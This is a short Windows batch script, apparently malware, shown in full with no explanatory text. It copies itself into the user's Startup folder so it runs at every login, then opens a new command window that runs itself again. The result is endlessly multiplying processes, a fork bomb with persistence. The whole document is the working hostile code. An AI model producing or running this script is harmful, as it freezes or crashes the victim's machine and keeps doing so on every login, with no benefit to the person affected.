@echo off
set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%~f0" "%startupPath%"
start cmd /k "%~0"
